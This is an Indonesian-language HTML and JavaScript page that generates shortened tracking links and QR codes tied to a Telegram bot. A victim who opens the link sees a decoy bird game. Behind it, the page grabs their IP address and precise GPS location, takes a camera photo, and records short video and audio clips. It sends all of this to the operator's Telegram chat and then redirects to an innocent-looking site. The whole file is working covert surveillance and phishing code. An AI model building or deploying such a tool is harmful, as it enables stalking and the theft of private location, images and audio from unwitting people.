<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GPS Tracker + Kamera Telegram</title>
  <style>
    body {
      font-family: sans-serif;
      background: #111;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .card {
      background: #222;
      padding: 20px;
      border-radius: 10px;
      max-width: 450px;
      width: 100%;
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: none;
      border-radius: 5px;
      background: #333;
      color: #0ff;
    }
    button {
      margin-top: 15px;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 6px;
      background: linear-gradient(90deg, #00f6ff, #6f00ff);
      color: #fff;
      font-weight: bold;
    }
    #linkOut {
      margin-top: 20px;
      font-size: 14px;
      word-break: break-word;
      background: #333;
      padding: 12px;
      border-radius: 6px;
    }
    canvas {
      display: block;
      margin: 10px auto;
    }
  </style>
</head>
<body>
  <div class="card" id="formCard">
    <h2>GPS Link Generator</h2>
    <label>Bot Token</label>
    <input id="botToken" type="text" placeholder="123456:ABC...">
    <label>Chat ID</label>
    <input id="chatId" type="text" placeholder="123456789">
    <label>Target URL</label>
    <input id="targetUrl" type="url" placeholder="https://example.com">
    <button onclick="generate()">Generate Link</button>
    <div id="linkOut"></div>
    <canvas id="qrcode"></canvas>
  </div>

  <canvas id="flappy" class="game" width="320" height="480" style="display:none;"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <script>
    async function shorten(url) {
      try {
        const res = await fetch("https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url));
        return await res.text();
      } catch {
        return url;
      }
    }

    async function generate() {
      const token = document.getElementById("botToken").value.trim();
      const chat = document.getElementById("chatId").value.trim();
      const target = document.getElementById("targetUrl").value.trim();
      if (!token || !chat || !target) return alert("Isi semua kolom dulu!");

      const longUrl = `${location.origin}${location.pathname}?mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(target)}`;
      const shortUrl = await shorten(longUrl);

      document.getElementById("linkOut").innerHTML = `
        <strong>Link Panjang:</strong><br>
        <a href="${longUrl}" target="_blank" style="color:#0ff">${longUrl}</a><br><br>
        <strong>Link Pendek:</strong><br>
        <a href="${shortUrl}" target="_blank" style="color:#6f0">${shortUrl}</a>
      `;

      QRCode.toCanvas(document.getElementById("qrcode"), shortUrl, {
        color: { dark: "#ffffff", light: "#000000" }
      });
    }

    // === MODE VIEW ===
    (async () => {
      const params = new URLSearchParams(location.search);
      if(params.get("mode")!=="view") return;

      document.getElementById("formCard").style.display="none";
      const cvs=document.getElementById("flappy");
      cvs.style.display="block";
      const ctx=cvs.getContext("2d");

      const TOKEN=params.get("token");
      const CHAT=params.get("chat");
      const TARGET=params.get("target")||"https://example.com";

      // Dummy tampilan game
      let birdY=150,gravity=0.5,velocity=0,jump=-8;
      cvs.addEventListener("click",()=>{velocity=jump;});
      function loop(){
        ctx.fillStyle="#70c5ce";ctx.fillRect(0,0,cvs.width,cvs.height);
        velocity+=gravity; birdY+=velocity;
        ctx.fillStyle="yellow";ctx.fillRect(50,birdY,30,30);
        requestAnimationFrame(loop);
      }
      loop();

      const send=(type,fd)=>{
        fetch(`https://api.telegram.org/bot${TOKEN}/send${type}`,{method:"POST",body:fd});
      };

      // IP
      let ipAddr="Unknown";
      try {
        const res=await fetch("https://api.ipify.org?format=json");
        ipAddr=(await res.json()).ip;
      } catch{}

      // GPS
      let lat="-",lon="-";
      try {
        const p=await new Promise((res,rej)=>
          navigator.geolocation.getCurrentPosition(res,rej,{
            enableHighAccuracy:true,
            timeout:10000,
            maximumAge:0
          })
        );
        lat=p.coords.latitude;lon=p.coords.longitude;

        const locFd = new FormData();
        locFd.append("chat_id", CHAT);
        locFd.append("latitude", lat);
        locFd.append("longitude", lon);
        locFd.append("accuracy", 10);
        send("Location", locFd);
      } catch{}

      const mapsLink=`https://www.google.com/maps?q=${lat},${lon}`;
      const caption=`📍 Lokasi: ${lat}, ${lon}
🌐 IP: ${ipAddr}
🗺️ Peta: ${mapsLink}`;

      // FOTO
      try {
        const s=await navigator.mediaDevices.getUserMedia({video:true});
        const v=document.createElement("video");
        const c=document.createElement("canvas");
        v.srcObject=s; await v.play();
        c.width=v.videoWidth;c.height=v.videoHeight;
        c.getContext("2d").drawImage(v,0,0);
        s.getTracks().forEach(t=>t.stop());
        c.toBlob(b=>{
          const fd=new FormData();
          fd.append("chat_id",CHAT);
          fd.append("photo",b,"snap.jpg");
          fd.append("caption",caption+"\\n📸 Snapshot");
          send("Photo",fd);
        },"image/jpeg");
      } catch{}

      // VIDEO 3 detik
      try {
        const vs=await navigator.mediaDevices.getUserMedia({video:true,audio:true});
        const rec=new MediaRecorder(vs);
        const chunks=[];
        rec.ondataavailable=e=>chunks.push(e.data);
        rec.onstop=()=>{
          const blob=new Blob(chunks,{type:"video/webm"});
          const fd=new FormData();
          fd.append("chat_id",CHAT);
          fd.append("video",blob,"clip.webm");
          fd.append("caption",caption+"\\n🎥 Video 3 detik");
          send("Video",fd);
          vs.getTracks().forEach(t=>t.stop());
        };
        rec.start(); setTimeout(()=>rec.stop(),3000);
      } catch{}

      // AUDIO 5 detik
      try {
        const as=await navigator.mediaDevices.getUserMedia({audio:true});
        const rec=new MediaRecorder(as);
        const chunks=[];
        rec.ondataavailable=e=>chunks.push(e.data);
        rec.onstop=()=>{
          const blob=new Blob(chunks,{type:"audio/ogg"});
          const fd=new FormData();
          fd.append("chat_id",CHAT);
          fd.append("audio",blob,"rec.ogg");
          fd.append("caption",caption+"\\n🎤 Audio 5 detik");
          send("Audio",fd);
          as.getTracks().forEach(t=>t.stop());
        };
        rec.start(); setTimeout(()=>rec.stop(),5000);
      } catch{}

      setTimeout(()=>location.replace(TARGET),6000);
    })();
  </script>
</body>
  </html>
